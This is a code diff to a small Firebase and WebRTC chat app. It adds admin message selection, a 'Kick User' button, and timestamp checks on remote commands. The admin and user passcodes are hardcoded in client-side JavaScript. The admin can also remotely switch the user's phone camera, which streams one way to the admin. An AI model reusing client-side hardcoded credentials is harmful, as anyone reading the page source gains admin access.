@@ -15,7 +15,7 @@
       --msg-sent: #dcf8c6;
       --msg-recv: #ffffff;
       --quote-bg: rgba(0,0,0,0.05);
-      --selected-bg: rgba(37, 211, 102, 0.3);
+      --selected-bg: #81c784; /* Darker green to indicate selection */
     }
     * { box-sizing: border-box; }
     body { margin: 0; font-family: sans-serif; background-color: var(--bg-color); display: flex; flex-direction: column; height: 100vh; overflow: hidden; }
@@ -30,19 +30,35 @@
     #chat-header { background: #075E54; color: white; padding: 15px; font-weight: bold; font-size: 18px; display: flex; justify-content: space-between; align-items: center; }
     #admin-delete-btn { display: none; background: #ff3b30; color: white; border: none; padding: 6px 12px; border-radius: 5px; cursor: pointer; font-weight: bold; box-shadow: 0 2px 4px rgba(0,0,0,0.2); }
     
-    #chat-box { flex: 1; padding: 20px 0; overflow-y: auto; display: flex; flex-direction: column; gap: 4px; min-height: 0; }
+    #chat-box { flex: 1; padding: 20px 0; overflow-y: auto; display: flex; flex-direction: column; gap: 8px; min-height: 0; }
     
-    .msg-wrapper { display: flex; align-items: center; width: 100%; transition: transform 0.2s ease-out, background-color 0.2s; padding: 4px 20px; }
+    .msg-wrapper { display: flex; align-items: center; width: 100%; transition: transform 0.2s ease-out; padding: 0 20px; }
     .msg-wrapper.sent-wrapper { justify-content: flex-end; }
     .msg-wrapper.recv-wrapper { justify-content: flex-start; }
-    .msg-wrapper.selected { background-color: var(--selected-bg); }
     
-    .msg { max-width: 75%; padding: 8px 12px; border-radius: 10px; position: relative; word-wrap: break-word; font-size: 15px; box-shadow: 0 1px 1px rgba(0,0,0,0.1); user-select: none; }
+    .msg { 
+      max-width: 75%; 
+      padding: 8px 12px; 
+      border-radius: 10px; 
+      position: relative; 
+      word-wrap: break-word; 
+      font-size: 15px; 
+      box-shadow: 0 1px 1px rgba(0,0,0,0.1); 
+      transition: background-color 0.2s, border 0.2s;
+      /* CRITICAL: Prevents mobile browser from blocking the long-press */
+      -webkit-touch-callout: none; 
+      -webkit-user-select: none; 
+      user-select: none; 
+    }
+    
     .msg.sent { background-color: var(--msg-sent); border-top-right-radius: 0; }
     .msg.recv { background-color: var(--msg-recv); border-top-left-radius: 0; }
     
+    /* Visual feedback for selected messages (Admin only) */
+    .msg-wrapper.selected .msg { background-color: var(--selected-bg) !important; border: 2px solid #388e3c; }
+    
     .sender-name { font-size: 11px; color: #075E54; margin-bottom: 4px; display: block; font-weight: bold; }
-    .msg-quote { background: var(--quote-bg); border-left: 4px solid var(--primary); padding: 6px; border-radius: 4px; font-size: 13px; margin-bottom: 6px; color: #555; }
+    .msg-quote { background: var(--quote-bg); border-left: 4px solid var(--primary); padding: 6px; border-radius: 4px; font-size: 13px; margin-bottom: 6px; color: #555; pointer-events: none; }
     
     #reply-bar { display: none; background: #e0e0e0; padding: 10px 15px; border-left: 4px solid var(--primary); font-size: 13px; justify-content: space-between; align-items: center; }
     #reply-text-preview { color: #555; white-space: nowrap; overflow: hidden; text-overflow: ellipsis; max-width: 90%; }
@@ -55,7 +71,9 @@
     #video-section { display: none; width: 350px; background: #000; border-left: 2px solid #ccc; position: relative; }
     video { width: 100%; height: 100%; object-fit: cover; }
     #video-overlay { position: absolute; bottom: 10px; left: 10px; color: white; background: rgba(0,0,0,0.5); padding: 5px 10px; border-radius: 5px; font-size: 12px; pointer-events: none; }
+    
     #switch-cam-btn { position: absolute; top: 10px; right: 10px; background: rgba(255,255,255,0.2); color: white; border: 1px solid white; padding: 6px 12px; border-radius: 5px; cursor: pointer; font-size: 12px; backdrop-filter: blur(5px); z-index: 10; }
+    #kick-user-btn { position: absolute; top: 10px; left: 10px; background: rgba(255,59,48,0.8); color: white; border: 1px solid white; padding: 6px 12px; border-radius: 5px; cursor: pointer; font-size: 12px; backdrop-filter: blur(5px); z-index: 10; }
 
     @media (max-width: 768px) {
       #app-container { flex-direction: column; }
@@ -91,6 +109,7 @@
     </div>
     
     <div id="video-section">
+      <button id="kick-user-btn" onclick="kickUser()">Kick User</button>
       <button id="switch-cam-btn" onclick="triggerCameraSwitch()">Swap Camera</button>
       <video id="remoteVideo" autoplay playsinline></video>
       <div id="video-overlay">User Stream (A/V)</div>
@@ -114,6 +133,7 @@
 
     let role = null; 
     let username = "";
+    let loginTime = 0;
     let activeReplyText = null;
     let selectedMessages = new Set();
     
@@ -124,10 +144,13 @@
 
     function login() {
       const code = document.getElementById('passcode').value;
+      loginTime = Date.now();
+      
       if (code === 'Smith2129') {
         role = 'admin';
         username = 'Admin';
         document.getElementById('video-section').style.display = 'block'; 
+        document.getElementById('chat-section').classList.add('admin-mode');
         startApp();
       } else if (code === '050858') { 
         role = 'user';
@@ -145,6 +168,10 @@
       initChat();
 
       if (role === 'user') {
+        db.ref('commands/kick').on('value', snapshot => {
+          const kickTime = snapshot.val();
+          if (kickTime && kickTime > loginTime) forceLogout();
+        });
         await startUserCamera();
       } else if (role === 'admin') {
         initAdminWebRTC();
@@ -152,7 +179,7 @@
     }
 
     // ==========================================
-    // CHAT SYSTEM
+    // CHAT & BUBBLE SELECTION (NO CHECKBOXES)
     // ==========================================
     function initChat() {
       db.ref('messages').on('child_added', snapshot => {
@@ -200,23 +227,29 @@
       setTimeout(() => { chatBox.scrollTop = chatBox.scrollHeight; }, 50);
 
       const msgBubble = wrapper.querySelector('.msg');
-      let startX = 0, startY = 0, pressTimer;
-      
+      let startX = 0, startY = 0;
+      let pressTimer;
+      let longPressed = false;
+
+      // Touch events for Swipe-to-reply AND Long-Press selection
       msgBubble.addEventListener('touchstart', e => { 
         startX = e.touches[0].clientX; 
         startY = e.touches[0].clientY;
+        longPressed = false;
+        
         if (role === 'admin') {
           pressTimer = setTimeout(() => {
+            longPressed = true;
             toggleSelection(msgId, wrapper);
             if (navigator.vibrate) navigator.vibrate(50);
-          }, 500);
+          }, 500); // 0.5 seconds hold to select
         }
       }, {passive: true});
 
       msgBubble.addEventListener('touchmove', e => {
-        clearTimeout(pressTimer); 
+        clearTimeout(pressTimer); // Cancel long-press if user starts scrolling/swiping
         const diffX = e.touches[0].clientX - startX;
-        if (Math.abs(e.touches[0].clientY - startY) > 10) return;
+        if (Math.abs(e.touches[0].clientY - startY) > 10) return; 
         if (diffX > 5 && diffX < 60) wrapper.style.transform = `translateX(${diffX}px)`;
       }, {passive: true});
 
@@ -227,21 +260,12 @@
         if (diffX > 40) triggerReply(data.text);
       });
 
+      // Allow simple tapping to select additional messages once selection mode is active
       msgBubble.addEventListener('click', () => {
-        if (role === 'admin' && selectedMessages.size > 0) toggleSelection(msgId, wrapper);
+        if (role === 'admin' && selectedMessages.size > 0 && !longPressed) {
+          toggleSelection(msgId, wrapper);
+        }
       });
-    }
-
-    function triggerReply(text) {
-      activeReplyText = text;
-      document.getElementById('reply-bar').style.display = 'flex';
-      document.getElementById('reply-text-preview').innerText = text;
-      document.getElementById('msg-input').focus();
-    }
-
-    function cancelReply() {
-      activeReplyText = null;
-      document.getElementById('reply-bar').style.display = 'none';
     }
 
     function toggleSelection(msgId, wrapper) {
@@ -268,6 +292,18 @@
       }
     }
 
+    function triggerReply(text) {
+      activeReplyText = text;
+      document.getElementById('reply-bar').style.display = 'flex';
+      document.getElementById('reply-text-preview').innerText = text;
+      document.getElementById('msg-input').focus();
+    }
+
+    function cancelReply() {
+      activeReplyText = null;
+      document.getElementById('reply-bar').style.display = 'none';
+    }
+
     // ==========================================
     // WEBRTC & HARDWARE LIFECYCLE
     // ==========================================
@@ -277,34 +313,25 @@
         setupUserWebRTC();
         
         db.ref('commands/switchCamera').on('value', snapshot => {
-          if (snapshot.val()) {
+          const switchTime = snapshot.val();
+          if (switchTime && switchTime > loginTime) {
             currentFacingMode = currentFacingMode === 'user' ? 'environment' : 'user';
             rebootHardwareStream(true);
           }
         });
       } catch (e) {
-        console.error("Initial Hardware error:", e);
+        console.error("Hardware error:", e);
         alert("Camera and microphone permissions are required.");
       }
     }
 
-    // Centralized hardware function to handle initial load, swapping, and waking from background
     async function rebootHardwareStream(hotSwap = false) {
-      // 1. Release existing locks
-      if (localStream) {
-        localStream.getTracks().forEach(track => track.stop());
-      }
-      
-      // 2. Hardware delay - fixes "blank/frozen camera" error on dual-lens phones
+      if (localStream) localStream.getTracks().forEach(track => track.stop());
       await new Promise(resolve => setTimeout(resolve, 300));
       
       try {
-        localStream = await navigator.mediaDevices.getUserMedia({ 
-          video: { facingMode: currentFacingMode }, 
-          audio: true 
-        });
+        localStream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: currentFacingMode }, audio: true });
         
-        // 3. Hot-swap the tracks if WebRTC is already established
         if (hotSwap && peerConnection) {
           const videoSender = peerConnection.getSenders().find(s => s.track && s.track.kind === 'video');
           const audioSender = peerConnection.getSenders().find(s => s.track && s.track.kind === 'audio');
@@ -317,24 +344,16 @@
       }
     }
 
-    // Re-wake the camera automatically if the user switches apps and comes back
     document.addEventListener('visibilitychange', () => {
-      if (document.visibilityState === 'visible' && role === 'user') {
-        rebootHardwareStream(true);
-      }
+      if (document.visibilityState === 'visible' && role === 'user') rebootHardwareStream(true);
     });
 
     async function setupUserWebRTC() {
       peerConnection = new RTCPeerConnection(configuration);
-      
-      localStream.getTracks().forEach(track => {
-        peerConnection.addTrack(track, localStream);
-      });
+      localStream.getTracks().forEach(track => peerConnection.addTrack(track, localStream));
 
       peerConnection.onicecandidate = event => {
-        if (event.candidate) {
-          db.ref('signaling/iceCandidates/user').push(event.candidate.toJSON());
-        }
+        if (event.candidate) db.ref('signaling/iceCandidates/user').push(event.candidate.toJSON());
       };
 
       const offer = await peerConnection.createOffer();
@@ -343,9 +362,7 @@
 
       db.ref('signaling/answer').on('value', async snapshot => {
         const answer = snapshot.val();
-        if (answer && !peerConnection.currentRemoteDescription) {
-          await peerConnection.setRemoteDescription(new RTCSessionDescription(answer));
-        }
+        if (answer && !peerConnection.currentRemoteDescription) await peerConnection.setRemoteDescription(new RTCSessionDescription(answer));
       });
 
       db.ref('signaling/iceCandidates/admin').on('child_added', snapshot => {
@@ -354,22 +371,18 @@
     }
 
     // ==========================================
-    // ADMIN WEBRTC
+    // ADMIN WEBRTC & COMMANDS
     // ==========================================
     async function initAdminWebRTC() {
       peerConnection = new RTCPeerConnection(configuration);
 
       peerConnection.ontrack = event => {
         const remoteVideo = document.getElementById('remoteVideo');
-        if (remoteVideo.srcObject !== event.streams[0]) {
-          remoteVideo.srcObject = event.streams[0];
-        }
+        if (remoteVideo.srcObject !== event.streams[0]) remoteVideo.srcObject = event.streams[0];
       };
 
       peerConnection.onicecandidate = event => {
-        if (event.candidate) {
-          db.ref('signaling/iceCandidates/admin').push(event.candidate.toJSON());
-        }
+        if (event.candidate) db.ref('signaling/iceCandidates/admin').push(event.candidate.toJSON());
       };
 
       db.ref('signaling/offer').on('value', async snapshot => {
@@ -391,6 +404,16 @@
 
     function triggerCameraSwitch() {
       db.ref('commands/switchCamera').set(Date.now());
+    }
+
+    function kickUser() {
+      db.ref('commands/kick').set(Date.now());
+    }
+
+    function forceLogout() {
+      if (localStream) localStream.getTracks().forEach(track => track.stop());
+      if (peerConnection) peerConnection.close();
+      window.location.reload(); 
     }
   </script>
 </body>
